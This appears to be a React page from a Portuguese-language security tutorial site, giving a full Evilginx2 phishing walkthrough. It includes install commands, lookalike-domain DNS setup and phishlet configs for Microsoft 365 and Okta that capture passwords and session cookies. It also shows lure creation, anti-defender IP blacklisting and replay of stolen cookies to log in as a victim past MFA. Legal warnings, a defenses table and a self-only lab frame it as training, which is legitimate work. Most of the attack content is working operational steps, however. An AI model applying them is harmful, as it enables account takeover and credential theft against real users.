import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Evilginx() {
  return (
    <PageContainer
      title="Evilginx2 — phishing MITM com bypass de 2FA"
      subtitle="Reverse-proxy de credenciais e session tokens. Captura cookies já autenticados, contornando MFA via código TOTP."
      difficulty="avancado"
      timeToRead="22 min"
    >
      <AlertBox type="danger" title="Uso APENAS em engagement autorizado">
        <p>
          Evilginx2 é uma ferramenta ofensiva poderosa. <strong>Usar contra alvos
          sem contrato escrito de Red Team é crime</strong> (Lei 12.737/2012, Art.
          154-A do CP no Brasil; CFAA nos EUA). Esta página é técnica e existe
          para profissionais que rodam campanhas autorizadas, treinamento em CTF
          e ambientes de laboratório próprios.
        </p>
      </AlertBox>

      <h2>O problema que ele resolve</h2>
      <p>
        Phishing tradicional (clone HTML estático + form que POSTa pra você)
        morreu para qualquer alvo com <strong>MFA</strong>. Mesmo com a senha
        correta o atacante esbarra no segundo fator. Evilginx ataca outra camada:
        ele atua como <strong>reverse proxy transparente</strong> entre vítima e
        site real (Microsoft, Google, Okta, etc.). Quando a vítima loga, o login
        é REAL — Evilginx só observa e <strong>captura o cookie de sessão já
        autenticado</strong>. Esse cookie pode ser injetado no navegador do
        atacante e ignora MFA, pois a sessão já está válida.
      </p>

      <h2>Instalação no Kali</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "dependências: Go 1.20+",
            cmd: "sudo apt update && sudo apt install -y golang-go git make",
            out: `Setting up golang-go (2:1.22~1) ...
0 upgraded, 4 newly installed.`,
            outType: "info",
          },
          {
            cmd: "git clone https://github.com/kgretzky/evilginx2.git && cd evilginx2",
            out: `Cloning into 'evilginx2'...
remote: Enumerating objects: 4218, done.
Receiving objects: 100% (4218/4218), 6.4 MiB | 14.2 MiB/s, done.`,
            outType: "success",
          },
          {
            cmd: "make",
            out: `go build -o ./build/evilginx -ldflags="-s -w -X main.gitVersion=3.3.0" ./cmd/evilginx
Build complete: ./build/evilginx`,
            outType: "success",
          },
          {
            cmd: "sudo ./build/evilginx -p ./phishlets/",
            out: `[evilginx][3.3.0] starting...
[!] You need to set up DNS A records and run as root for ports 80/443.
:: phishlets [0/0]`,
            outType: "warning",
          },
        ]}
      />

      <h2>Pré-requisitos de infraestrutura</h2>
      <p>
        Sem domínio + DNS controlado, Evilginx não funciona. Você precisa de:
      </p>
      <ul>
        <li>Domínio próprio (ex: <code>contoso-365-login.com</code>) — registrar via Namecheap/Porkbun, evitar Cloudflare proxy.</li>
        <li>VPS Linux com IP público (DigitalOcean, Hetzner, Vultr — ~$6/mês).</li>
        <li>Portas 53 (DNS), 80, 443 abertas no firewall.</li>
        <li>NS records do domínio apontando para o IP do VPS (Evilginx faz auto-resolução por wildcard).</li>
      </ul>

      <CodeBlock
        language="bash"
        title="DNS no registrador (exemplo)"
        code={`# Glue records / NS apontando para a VPS
ns1.contoso-365-login.com.   IN A   203.0.113.45
ns2.contoso-365-login.com.   IN A   203.0.113.45

# Domínio usa esses NS
contoso-365-login.com.       NS     ns1.contoso-365-login.com.
contoso-365-login.com.       NS     ns2.contoso-365-login.com.`}
      />

      <h2>Anatomia de um phishlet</h2>
      <p>
        <strong>Phishlets</strong> são YAMLs que descrevem como proxiar um site:
        domínios a interceptar, cookies a capturar, sub-filtros (regex) para
        reescrever URLs e remover proteções (CSP, integrity hashes).
      </p>

      <CodeBlock
        language="yaml"
        title="phishlets/o365.yaml (trecho)"
        code={`name: 'o365'
author: '@kgretzky'
min_ver: '3.0.0'

proxy_hosts:
  - { phish_sub: 'login',   orig_sub: 'login',         domain: 'microsoftonline.com', session: true, is_landing: true }
  - { phish_sub: 'www',     orig_sub: 'www',           domain: 'office.com',          session: false }

sub_filters:
  - { triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com',
      search: 'href="https://{hostname}/', replace: 'href="https://{hostname}/', mimes: ['text/html'] }

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.microsoftonline.com'
  path: '/'`}
      />

      <h2>Comandos do REPL</h2>
      <CommandTable
        title="evilginx interactive shell"
        variations={[
          { cmd: "config domain contoso-365-login.com", desc: "Define domínio raiz a ser servido.", output: "[*] server domain set to: contoso-365-login.com" },
          { cmd: "config ipv4 203.0.113.45", desc: "IP público da VPS.", output: "[*] server IP set to: 203.0.113.45" },
          { cmd: "phishlets hostname o365 login.contoso-365-login.com", desc: "Vincula phishlet a hostname público.", output: "[*] phishlet 'o365' hostname set to: login.contoso-365-login.com" },
          { cmd: "phishlets enable o365", desc: "Liga o phishlet (Evilginx baixa cert Let's Encrypt automático).", output: "[+] phishlet 'o365' enabled" },
          { cmd: "lures create o365", desc: "Cria um lure (URL com path randômico).", output: "[*] created lure with ID: 0" },
          { cmd: "lures get-url 0", desc: "Mostra a URL final pra mandar pra vítima.", output: "https://login.contoso-365-login.com/auth/eyJ0eXAiOi..." },
          { cmd: "sessions", desc: "Lista todas as sessões capturadas.", output: "id | phishlet | username | password | tokens | remote_ip" },
          { cmd: "sessions 1", desc: "Detalhe de uma sessão (com tokens prontos pra exportar).", output: "username : alice@contoso.com\\npassword : Welcome2026!" },
          { cmd: "blacklist unauth", desc: "Banir IPs que acessarem fora do path de lure (anti-blue-team).", output: "[*] blacklist mode set to: unauth" },
          { cmd: "config redirect_url https://office.com", desc: "Pra onde mandar quem cair fora do lure (camuflagem).", output: "[*] unauthorized requests will be redirected to: https://office.com" },
        ]}
      />

      <h2>Fluxo de uma campanha completa</h2>
      <Terminal
        path="~/evilginx2"
        lines={[
          { cmd: "sudo ./build/evilginx -p ./phishlets/ -developer", out: ":: evilginx 3.3.0", outType: "muted" },
          { comment: "dentro do shell evilginx", cmd: "config domain contoso-365-login.com", out: "[*] domain set", outType: "info" },
          { cmd: "config ipv4 203.0.113.45", out: "[*] ip set", outType: "info" },
          { cmd: "phishlets hostname o365 login.contoso-365-login.com", out: "[*] hostname set", outType: "info" },
          {
            cmd: "phishlets enable o365",
            out: `[+] requesting SSL/TLS certificates from LetsEncrypt...
[+] obtained SSL/TLS certificates for domain: 'login.contoso-365-login.com'
[+] phishlet 'o365' enabled`,
            outType: "success",
          },
          {
            cmd: "lures create o365",
            out: `[*] created lure with ID: 0`,
            outType: "success",
          },
          {
            cmd: "lures edit 0 redirect_url https://teams.microsoft.com",
            out: "[*] lure 'redirect_url' set to 'https://teams.microsoft.com'",
            outType: "info",
          },
          {
            cmd: "lures get-url 0",
            out: "https://login.contoso-365-login.com/auth/eyJ0eXAi...",
            outType: "warning",
          },
        ]}
      />

      <h2>Captura ao vivo</h2>
      <Terminal
        path="~/evilginx2"
        lines={[
          {
            comment: "vítima abre a URL, loga, MFA acontece...",
            cmd: "(aguardando)",
            out: `[03:14:22] [+] [o365] new visitor IP: 198.51.100.77 UA: 'Mozilla/5.0 (Windows NT 10.0)'
[03:14:34] [+] [o365] Username: [alice@contoso.com]
[03:14:36] [+] [o365] Password: [Welcome2026!]
[03:14:51] [+] [o365] all authorization tokens intercepted!
[03:14:51] [+] [o365] login: alice@contoso.com  =>  CAPTURED`,
            outType: "success",
          },
          {
            cmd: "sessions 1",
            out: `   id            : 1
   phishlet      : o365
   username      : alice@contoso.com
   password      : Welcome2026!
   tokens:
     ESTSAUTH               : 0.AXYAtBPqBT...
     ESTSAUTHPERSISTENT     : 0.AXYAtBPqBT...
     SignInStateCookie      : eyJyZ2NoIjoxNzM2...
   landing url   : https://login.contoso-365-login.com/auth/eyJ...
   user-agent    : Mozilla/5.0 (Windows NT 10.0; Win64; x64)
   remote addr   : 198.51.100.77`,
            outType: "info",
          },
        ]}
      />

      <h2>Importar a sessão no navegador</h2>
      <p>
        Os tokens vêm em formato JSON pronto pra extensão <strong>Cookie-Editor</strong>
        (Firefox/Chrome). Cole, navegue para <code>office.com</code>, e você
        está logado como a vítima — sem precisar do segundo fator.
      </p>

      <CodeBlock
        language="json"
        title="export pronto pra Cookie-Editor"
        code={`[
  {
    "domain": ".login.microsoftonline.com",
    "name": "ESTSAUTH",
    "value": "0.AXYAtBPqBT...",
    "path": "/",
    "httpOnly": true,
    "secure": true
  },
  {
    "domain": ".login.microsoftonline.com",
    "name": "ESTSAUTHPERSISTENT",
    "value": "0.AXYAtBPqBT...",
    "path": "/",
    "httpOnly": true,
    "secure": true,
    "expirationDate": 1767225600
  }
]`}
      />

      <h2>Customizar phishlet do zero</h2>
      <p>
        Sites mudam markup constantemente. Um phishlet quebrado é silencioso —
        o login passa, mas o token não é capturado. Inspecione com Burp e
        ajuste <code>auth_tokens</code> e <code>sub_filters</code>:
      </p>

      <CodeBlock
        language="yaml"
        title="phishlets/custom-okta.yaml"
        code={`name: 'okta-custom'
author: 'redteam@empresa'
min_ver: '3.0.0'

proxy_hosts:
  - { phish_sub: 'sso',  orig_sub: 'company',  domain: 'okta.com', session: true, is_landing: true }

sub_filters:
  - { triggers_on: 'company.okta.com', orig_sub: 'company', domain: 'okta.com',
      search: '"baseUrl":"https://{hostname}"', replace: '"baseUrl":"https://{hostname}"',
      mimes: ['application/json', 'text/html'] }
  # Remove integrity= dos <script> p/ poder reescrever
  - { triggers_on: 'company.okta.com', orig_sub: 'company', domain: 'okta.com',
      search: 'integrity="sha384-[A-Za-z0-9+/=]+"', replace: '', mimes: ['text/html'], with_params: ['code'] }

auth_tokens:
  - domain: '.okta.com'
    keys: ['DT', 'sid', 'JSESSIONID']
  - domain: 'company.okta.com'
    keys: ['ln', 't']

credentials:
  username: { key: 'username', search: '"username":"([^"]*)', type: 'json' }
  password: { key: 'password', search: '"password":"([^"]*)', type: 'json' }

login:
  domain: 'company.okta.com'
  path: '/login/login.htm'`}
      />

      <h2>Defesas e detecção (perspectiva do alvo)</h2>
      <CommandTable
        title="O que blue team caça"
        variations={[
          { cmd: "Conditional Access — geo + device", desc: "Bloquear login de IP/país inesperado mesmo com MFA OK.", output: "Mata maioria dos session-replay attacks." },
          { cmd: "FIDO2 / WebAuthn", desc: "Hardware key validate origin = domínio real, não o phish.", output: "Evilginx NÃO consegue proxiar WebAuthn — origin mismatch quebra." },
          { cmd: "Token-binding / DPoP", desc: "Cookie atrelado ao TLS handshake do cliente.", output: "Sessão exportada não funciona em outro browser." },
          { cmd: "DMARC + DKIM + SPF reject", desc: "Email enviando o lure cai em spam ou nem entrega.", output: "Mata phishing em fase 1." },
          { cmd: "Certificate transparency monitoring", desc: "Caça emissões de cert pra domínios parecidos com seu.", output: "crt.sh + alerta em real-time." },
          { cmd: "User reporting button (PhishER)", desc: "Funcionário reporta, SOC bloqueia domínio em min.", output: "Single source of truth do incidente." },
        ]}
      />

      <PracticeBox
        title="Lab autorizado: rode Evilginx contra você mesmo"
        goal="Subir Evilginx local com phishlet de teste (não-prod) e capturar uma sessão de TESTE para entender o fluxo. ZERO interação com terceiros."
        steps={[
          "Compre um domínio descartável (~$2/ano) e aponte para uma VPS sua.",
          "Crie uma conta de TESTE descartável em algum SaaS suportado.",
          "Habilite o phishlet, gere o lure, abra a URL no SEU próprio navegador.",
          "Faça o login com a conta de teste, observe a captura no console.",
          "Importe os cookies em Firefox container e valide acesso.",
          "Apague tudo (sessions, conta de teste, phishlet) ao final.",
        ]}
        command={`# dentro do shell evilginx
config domain seu-lab-teste.com
config ipv4 $(curl -s ifconfig.me)
phishlets hostname o365 login.seu-lab-teste.com
phishlets enable o365
lures create o365
lures get-url 0
# abra a URL retornada no SEU navegador, faça o login com conta TESTE`}
        expected={`[+] [o365] all authorization tokens intercepted!
[+] [o365] login: teste@seu-lab.com => CAPTURED`}
        verify="A linha 'CAPTURED' no log + sessions mostrar tokens preenchidos confirma. Use Cookie-Editor para validar replay."
      />

      <AlertBox type="warning" title="Limitações conhecidas">
        <p>
          Evilginx <strong>NÃO bypassa</strong>: WebAuthn/FIDO2, certificate-bound
          tokens (DPoP), apps que validam device fingerprint server-side, push
          MFA com number-matching (Microsoft Authenticator desde 2023).
          Conditional Access bem configurado (geo, device compliance, sign-in
          risk) frequentemente quebra a sessão exportada em segundos.
        </p>
      </AlertBox>

      <AlertBox type="info" title="Variantes e alternativas">
        <p>
          <strong>Modlishka</strong> (drk1wi) — outro reverse-proxy phishing,
          configuração mais simples mas menos phishlets prontos.
          <br />
          <strong>Muraena</strong> — modular, foca em pipelines automatizadas.
          <br />
          <strong>EvilProxy</strong> — versão SaaS comercial usada por crime
          organizado (não usar, ilegal e instável).
        </p>
      </AlertBox>
    </PageContainer>
  );
}
